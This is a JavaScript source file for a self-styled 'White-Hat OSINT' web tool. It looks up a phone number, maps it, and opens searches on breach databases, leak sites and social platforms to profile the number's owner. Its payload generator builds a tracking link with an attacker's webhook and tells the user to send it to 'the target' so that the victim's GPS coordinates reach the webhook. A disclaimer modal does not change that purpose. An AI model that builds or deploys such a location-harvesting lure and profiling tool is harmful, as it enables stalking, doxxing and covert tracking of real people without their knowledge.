// White-Hat OSINT Intelligence Suite - Core Logic

let map;
let marker;
let currentTab = 'recon';
let libPhone;
let lastGeneratedLink = "";

// Safe Library Access
function getLibPhone() {
    if (typeof libphonenumber !== 'undefined') return libphonenumber;
    if (typeof window.libphonenumber !== 'undefined') return window.libphonenumber;
    return null;
}

// Initialize Map with custom styles
function initMap(lat = 0, lon = 0, zoom = 2, style = 'dark') {
    if (map) {
        map.remove();
    }
    map = L.map('map', {
        zoomControl: false
    }).setView([lat, lon], zoom);

    L.control.zoom({ position: 'bottomright' }).addTo(map);

    const tileUrl = style === 'satellite'
        ? 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}'
        : style === 'hybrid'
            ? 'https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}'
            : 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';

    const tileOptions = style === 'hybrid'
        ? { subdomains: ['mt0', 'mt1', 'mt2', 'mt3'], attribution: '&copy; Google Maps' }
        : { attribution: '&copy; White-Hat Intelligence Hub' };

    L.tileLayer(tileUrl, tileOptions).addTo(map);
}

// Logic for Geocoding to Lat/Lon
async function getCoordinates(location) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(location)}`);
        const data = await response.json();
        if (data && data.length > 0) {
            return {
                lat: parseFloat(data[0].lat),
                lon: parseFloat(data[0].lon)
            };
        }
    } catch (e) { console.error("Geocoding failure:", e); }
    return null;
}

// Logic for Reverse Geocoding (Coords to Address)
async function reverseGeocode(lat, lon) {
    try {
        showStatus("Resolving physical address...", "success");
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        if (data && data.display_name) {
            const addressBar = document.getElementById('resolved-address-bar');
            const addressText = document.getElementById('resolved-address-text');
            addressBar.classList.remove('hidden');
            addressText.textContent = data.display_name;
            showStatus("Address Resolved.", "success");
        }
    } catch (e) {
        console.error("Reverse geocoding failure:", e);
        showStatus("Resolution Failed.", "error");
    }
}

// Tab Switching
const navItems = document.querySelectorAll('.nav-item');
navItems.forEach(item => {
    item.addEventListener('click', () => {
        const tab = item.getAttribute('data-tab');
        if (tab === 'methodology') {
            toggleModal(true);
            return;
        }

        navItems.forEach(i => i.classList.remove('active'));
        item.classList.add('active');

        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById(`${tab}-tab`).classList.add('active');
        currentTab = tab;
    });
});

// Modal Logic
const modal = document.getElementById('methodology-modal');
const closeModal = document.querySelector('.close-modal');
function toggleModal(show) {
    modal.classList.toggle('hidden', !show);
    if (show) loadMethodology();
}
closeModal.onclick = () => toggleModal(false);
window.onclick = (e) => { if (e.target == modal) toggleModal(false); }

async function loadMethodology() {
    const body = document.getElementById('methodology-body');
    try {
        const res = await fetch('methodology.md');
        const text = await res.text();
        // Basic markdown formatting simulator
        body.innerHTML = text.replace(/# (.*)/g, '<h2>$1</h2>')
            .replace(/## (.*)/g, '<h3>$1</h3>')
            .replace(/- (.*)/g, '<li>$1</li>')
            .replace(/\n/g, '<br>');
    } catch (e) {
        body.innerHTML = "Error loading methodology. Ensure methodology.md is in the project root.";
    }
}

// Analysis Logic
const analyzeBtn = document.getElementById('analyze-btn');
const phoneInput = document.getElementById('phone-input');
const dashboard = document.getElementById('results-dashboard');

async function handleAnalysis() {
    const rawNumber = phoneInput.value.trim();
    if (!rawNumber) return;

    libPhone = getLibPhone();
    if (!libPhone) {
        alert("CRITICAL ERROR: Phone intelligence library (libphonenumber) failed to load. Check your internet connection.");
        return;
    }

    try {
        const phoneNumber = libPhone.parsePhoneNumber(rawNumber);
        if (!phoneNumber || !phoneNumber.isValid()) {
            showStatus("ALERT: Invalid MSISDN target string.", "error");
            return;
        }

        // Update UI state
        document.getElementById('current-target').textContent = phoneNumber.number;
        dashboard.classList.remove('dashboard-hidden');
        dashboard.classList.add('dashboard-visible');

        // Populate Data
        document.getElementById('res-country').textContent = phoneNumber.country || "UNKNOWN";
        document.getElementById('res-type').textContent = phoneNumber.getType() || "MOBILE/VOIP";
        document.getElementById('res-carrier').textContent = "AUTO_FIX_PENDING";

        // Better timezone mock or estimation
        const tzMapping = { 'IN': '+5:30', 'US': '-5:00', 'GB': '+0:00', 'FR': '+1:00', 'DE': '+1:00' };
        document.getElementById('res-timezone').textContent = "UTC " + (tzMapping[phoneNumber.country] || "VARIES");

        // Geocoding
        const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
        const cName = phoneNumber.country ? regionNames.of(phoneNumber.country) : "Earth";

        showStatus("Fetching Geospatial Data...", "success");
        const coords = await getCoordinates(cName);
        if (coords) {
            updateMapDisplay(coords.lat, coords.lon, 6);
            showStatus("Recon Complete. Target Geocoded.", "success");
        } else {
            showStatus("Geocoding failed. Using Regional default.", "error");
            updateMapDisplay(0, 0, 2);
        }

        setupPivots(phoneNumber.number);

    } catch (e) {
        console.error(e);
        showStatus("SCAN ERROR: Format must be +[CountryCode][Number]", "error");
    }
}

function updateMapDisplay(lat, lon, zoom = 15, accuracy = 'estimated') {
    initMap(lat, lon, zoom);

    const labelColor = accuracy === 'verified' ? '#00ff41' : '#ffaa00';
    const labelText = accuracy === 'verified' ? '[ VERIFIED GPS FIX ]' : '[ REGIONAL ESTIMATE ]';

    marker = L.marker([lat, lon]).addTo(map)
        .bindPopup(`
            <b style="color:${labelColor}">${labelText}</b><br>
            LAT: ${lat.toFixed(6)}<br>
            LNG: ${lon.toFixed(6)}<br>
            <span style="font-size:0.7rem; color:#888;">Target precision: ${accuracy === 'verified' ? 'Building level' : 'Regional center'}</span>
        `)
        .openPopup();

    document.getElementById('lat-val').textContent = lat.toFixed(5);
    document.getElementById('lng-val').textContent = lon.toFixed(5);
}

// Demo: Capture Real GPS
async function captureMyGPS() {
    showStatus("Accessing local GPS sensor...", "success");
    if (!navigator.geolocation) {
        showStatus("GPS Sensor not found.", "error");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            showStatus("REAL GPS CAPTURED", "success");
            updateMapDisplay(lat, lon, 18, 'verified');
            document.getElementById('manual-lat').value = lat.toFixed(6);
            document.getElementById('manual-lng').value = lon.toFixed(6);

            // Auto-resolve address for the real location
            reverseGeocode(lat, lon);
        },
        (error) => {
            console.error(error);
            showStatus("Permission Denied / Timeout", "error");
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

// Pivot Logic
function setupPivots(fullNumber) {
    const btns = document.querySelectorAll('.pivot-btn');
    const cleanNum = fullNumber.replace('+', '');

    btns.forEach(btn => {
        btn.onclick = () => {
            const type = btn.getAttribute('data-type');
            let url = "";
            switch (type) {
                case 'intelx': url = `https://intelx.io/?s=${fullNumber}`; break;
                case 'dehashed': url = `https://dehashed.com/search?query=${fullNumber}`; break;
                case 'whatsapp': url = `https://wa.me/${cleanNum}`; break;
                case 'telegram': url = `https://t.me/+${cleanNum}`; break;
                case 'truecaller': url = `https://www.truecaller.com/search/global/${cleanNum}`; break;
                case 'google-geo': url = `https://www.google.com/search?q="${fullNumber}" (location OR city OR "near:")`; break;
                case 'leaks': url = `https://www.google.com/search?q="${fullNumber}" site:pastebin.com OR site:github.com`; break;
                case 'hlr': url = `https://www.google.com/search?q=HLR+lookup+${cleanNum}`; break;
            }
            window.open(url, '_blank');
        };
    });
}

// Digital Footprint Scraper Logic
document.querySelectorAll('.scraper-btn').forEach(btn => {
    btn.onclick = () => {
        const platform = btn.getAttribute('data-search');
        const target = phoneInput.value || document.getElementById('clue-name').value;
        if (!target) {
            showStatus("No Target Defined", "error");
            return;
        }

        let url = "";
        switch (platform) {
            case 'instagram': url = `https://www.google.com/search?q=site:instagram.com "${target}" (location OR check-in)`; break;
            case 'twitter': url = `https://twitter.com/search?q="${target}"&f=live`; break;
            case 'linkedin': url = `https://www.google.com/search?q=site:linkedin.com "${target}" location`; break;
            case 'facebook': url = `https://www.facebook.com/search/top/?q=${encodeURIComponent(target + ' location')}`; break;
        }
        window.open(url, '_blank');
        showStatus(`Scraping ${platform.toUpperCase()}...`, "success");
    };
});

// Payload Generator
const genPayloadBtn = document.getElementById('generate-payload-btn');
const payloadOutput = document.getElementById('payload-output');
const codeBlock = document.getElementById('generated-code');

if (genPayloadBtn) {
    genPayloadBtn.onclick = () => {
        const type = document.getElementById('payload-type').value;
        const redirect = document.getElementById('payload-redirect').value || "https://google.com/maps";
        const webhook = document.getElementById('payload-webhook').value || "";
        const targetNum = phoneInput.value.replace(/\D/g, '') || "XXXXX";

        // Generate real functioning URL pointing to our payload.html
        const baseUrl = window.location.href.split('index.html')[0];
        lastGeneratedLink = `${baseUrl}payload.html?wh=${encodeURIComponent(webhook)}&t=${targetNum}&r=${encodeURIComponent(redirect)}`;

        const payloadCode = `
[+] REAL-WORLD TRACKING LINK GENERATED
--------------------------------------
THEME: ${type.toUpperCase()}
LISTENER_ID: L-${Math.random().toString(36).substr(2, 6).toUpperCase()}
WEBHOOK_ATTACHED: ${webhook ? "YES" : "NO (Simulation Only)"}

[!] LIVE PAYLOAD URL:
${lastGeneratedLink}

[!] INSTRUCTION:
1. Send this link to the target.
2. If they click and allow location, coordinates will hit your Webhook.
3. Use the 'REFINE' panel to manually paste coordinates to see them on map.
    `;
        codeBlock.textContent = payloadCode;
        payloadOutput.classList.remove('hidden');
        showStatus("Real-World Link Ready", "success");
    };
}

const copyPayloadBtn = document.getElementById('copy-payload-btn');
if (copyPayloadBtn) {
    copyPayloadBtn.onclick = () => {
        if (lastGeneratedLink) {
            navigator.clipboard.writeText(lastGeneratedLink);
            showStatus("Link Only Copied", "success");
        } else {
            showStatus("Generate Link First", "error");
        }
    };
}

const demoGpsBtn = document.getElementById('demo-gps-btn');
if (demoGpsBtn) {
    demoGpsBtn.onclick = () => captureMyGPS();
}

const simulatePayloadBtn = document.getElementById('simulate-payload-btn');
if (simulatePayloadBtn) {
    simulatePayloadBtn.onclick = () => {
        showStatus("Waiting for target interaction...", "success");
        setTimeout(() => {
            const lat = (Math.random() * (19.2 - 19.1) + 19.127).toFixed(6); // Vile Parle / Mumbai Area
            const lng = (Math.random() * (72.9 - 72.8) + 72.846).toFixed(6);
            showStatus("COORDINATES RECEIVED!", "success");

            // Reveal Dashboard and hide search
            resultsDashboard.classList.remove('dashboard-hidden');
            resultsDashboard.classList.add('dashboard-visible');
            document.querySelector('.search-bar-container').classList.add('hidden');
            document.getElementById('current-target').textContent = phoneInput.value || "+[SIMULATED]";

            // Auto-switch to Recon tab to show result
            const reconTab = document.querySelector('.nav-item[data-tab="recon"]');
            if (reconTab) reconTab.click();

            updateMapDisplay(parseFloat(lat), parseFloat(lng), 16, 'verified');
            document.getElementById('manual-lat').value = lat;
            document.getElementById('manual-lng').value = lng;

            // Update dummy stats for simulation
            document.getElementById('res-country').textContent = "SIMULATED";
            document.getElementById('res-carrier').textContent = "VIRTUAL-NETWORK";
        }, 4000);
    };
}

function cleanNumber() { return phoneInput.value.replace(/\D/g, ''); }

// Manual Refine
const refineToggle = document.getElementById('refine-toggle-btn');
const refinePanel = document.getElementById('manual-refine-panel');
const updateBtn = document.getElementById('update-map-btn');

refineToggle.onclick = () => refinePanel.classList.toggle('hidden');

updateBtn.onclick = () => {
    const lat = parseFloat(document.getElementById('manual-lat').value);
    const lng = parseFloat(document.getElementById('manual-lng').value);
    if (!isNaN(lat) && !isNaN(lng)) {
        updateMapDisplay(lat, lng, 16);
    }
};

// Reverse Geocoding Button
const resolveBtn = document.getElementById('resolve-address-btn');
if (resolveBtn) {
    resolveBtn.onclick = () => {
        const lat = parseFloat(document.getElementById('lat-val').textContent);
        const lon = parseFloat(document.getElementById('lng-val').textContent);
        reverseGeocode(lat, lon);
    };
}

// Intelligence Correlation Search
document.querySelectorAll('.clue-search-btn').forEach(btn => {
    btn.onclick = () => {
        const source = btn.getAttribute('data-source');
        const name = document.getElementById('clue-name').value;
        const address = document.getElementById('clue-address').value;
        const image = document.getElementById('clue-image').value;

        let query = "";
        if (source === 'social') {
            query = `https://www.google.com/search?q="${name}" (site:instagram.com OR site:facebook.com OR site:twitter.com OR site:linkedin.com)`;
        } else if (source === 'maps') {
            query = `https://www.google.com/maps/search/${encodeURIComponent(address + " " + name)}`;
        } else if (source === 'images') {
            query = `https://www.google.com/search?tbm=isch&q=${encodeURIComponent(name + " " + image)}`;
        }

        if (query) window.open(query, '_blank');
    };
});

// Map Style Toggle
document.querySelectorAll('.map-style-btn').forEach(btn => {
    btn.onclick = () => {
        const style = btn.getAttribute('data-style');
        const lat = parseFloat(document.getElementById('lat-val').textContent);
        const lng = parseFloat(document.getElementById('lng-val').textContent);
        initMap(lat, lng, map.getZoom(), style);
        L.marker([lat, lng]).addTo(map);
    }
});

function showStatus(msg, type) {
    const clock = document.getElementById('clock');
    if (!clock) return;
    clock.style.color = type === 'error' ? '#ff4100' : '#00ff41';
    clock.textContent = `[ ${msg.toUpperCase()} ]`;
    setTimeout(() => {
        clock.style.color = '';
        updateClock();
    }, 3000);
}

// Utilities
function updateClock() {
    const now = new Date();
    document.getElementById('clock').textContent = now.toISOString().split('T')[1].split('.')[0] + " UTC";
}
setInterval(updateClock, 1000);

analyzeBtn.addEventListener('click', handleAnalysis);
phoneInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleAnalysis(); });

window.onload = () => {
    initMap();
    updateClock();

    // Terms of Service Logic
    const tosModal = document.querySelector('.tos-modal');
    const acceptBtn = document.getElementById('accept-tos');

    if (tosModal && !localStorage.getItem('osint_tos_accepted')) {
        tosModal.classList.remove('hidden');
    }

    if (acceptBtn) {
        acceptBtn.onclick = () => {
            localStorage.setItem('osint_tos_accepted', 'true');
            tosModal.classList.add('hidden');
            showStatus("Legal Disclaimer Accepted", "success");
        };
    }
};
